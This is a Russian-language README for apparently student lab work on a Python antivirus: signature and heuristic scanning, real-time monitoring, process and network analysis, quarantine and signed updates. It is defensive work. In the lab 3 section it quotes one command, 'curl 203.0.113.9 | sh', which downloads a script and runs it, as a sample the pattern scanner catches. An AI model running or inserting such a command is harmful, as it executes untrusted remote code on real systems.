# Реализация лабораторных №3–6

Сводка функций Ф-01…Ф-25 ТЗ, указания где находится реализация и сводка ограничений — в [COVERAGE.md](COVERAGE.md).

## №3. Сигнатурный анализ и файловый сканер (Ф-04, Ф-10)

Цель — находить известные угрозы по хэшам и шаблонам. Задачи выполнены в `signatures.py` и `scanner.py`: потоковое вычисление SHA-256 **и MD5** за один проход, база хэш-сигнатур **и байтовых шаблонов** (JSON, атомарная запись, CRUD), рекурсивный обход файловой системы, исключения (пути и маски), обработка ошибок доступа. При повреждении основной базы сигнатур автоматически использует резервную копию (`*.backup.json`, Ф-10 «надёжность»). Результат содержит путь, имя, хэш, статус, угрозу и время. Пример: файл со строкой `curl 203.0.113.9 | sh` обнаруживается шаблоном без известного хеша; 100 МБ-файл проверяется за доли секунды (замеры в [TESTING.md](TESTING.md)).

## №4. Защита в реальном времени, эвристика, процессы (Ф-09, Ф-11, Ф-12, Ф-24)

`realtime.py` подключает события файловой системы ОС через `watchdog` (inotify / ReadDirectoryChangesW / kqueue); дедупликация по (путь, mtime), конвейер «событие → журнал → скан → политика». Политика `realtime.action_on_detection`: `observe`, `notify`, `quarantine` (автокарантин только после явного «взвода»). Задержка реакции измеряется и журналируется (`reaction_ms`, см. [TESTING.md](TESTING.md)). Если watchdog отсутствует — резервный опрос метаданных (честно помечено). `heuristic.py` проверяет расширение, формат, двойное расширение, опасные строки, энтропию (без эмуляции кода). `behavior.py` снимает процессы через psutil и коррелирует их с **настраиваемыми шаблонами** `behavior_templates` (цепочки «родитель → потомок», ID стилей Ф-12); дефолтный набор покрывает офисные цепочки. Исключения поддерживают маски (`*.pdf.exe`).

## №5. Сетевой анализ (тема 3.2)

`network.py`: интерфейсы и соединения psutil, разбор метаданных IP/TCP/UDP/DNS Scapy при перехвате пакетов, скользящее окно с правилами burst/повторов/локальные-IOC, агрегация потоков; `analyze_pcap` применяет тот же конвейер к сохранённому файлу захвата (тесты создают синтетический PCAP). Правила и списки подозрительных IP/доменов задаются в `network_rules` конфигурации.

## №6. Реагирование и комплексное тестирование (Ф-13…Ф-17, Ф-20-Ф-22, раздел 10.2)

`core.py` объединяет модули в единый конвейер и применяет политику; `events.py` — журнал с `event_id`, версиями движка/базы, **ротацией по 100 МБ**, сроком хранения и **хеш-цепочкой** (подмена записей обнаруживается `verify`, Ф-20 «защита журнала от несанкционированного изменения»). `quarantine.py`: лимиты 10 ГБ/10 000 объектов/30 дней + проверка дискового пространства (Ф-15/4.4), **безопасное удаление с перезаписью** (Ф-16), восстановление с повторным сканированием и меткой (Ф-17), обслуживание по сроку хранения. `updates.py`: манифест с **подписью Ed25519**, атомарная применение, резервная копия и **откат** (Ф-18 по выбранному каналу: локальный подписанный пакет; сетевая загрузка не реализована). `selfprotect.py`: единственный экземпляр (lock), контроль целостности конфигурации/базы (`tamper_detected`), права 0700/0600, команда `doctor` (самотестирование, Ф-25 частично). `ui.py` — нативное Qt-окно с системными уведомлениями находок (Ф-22), `cli.py` — терминальные команды, `report.py` — отчёты **JSON/CSV/TXT** (TXT — формат Г.6, Ф-21). Комплексный сценарий раздела 10.2 (EICAR → карантин → чистый файл без FP → обновление валидной/повреждённой подписи → самозащита → отчёт) покрыт автоматическим тестом.

Технологии: Python 3.10+, стандартная библиотека, psutil, Scapy, cryptography (AES-256-GCM, Ed25519), watchdog, PySide6 Essentials, pytest. Подтверждённые численные результаты — в [TESTING.md](TESTING.md); соответствие каждой функции ТЗ — в [COVERAGE.md](COVERAGE.md).
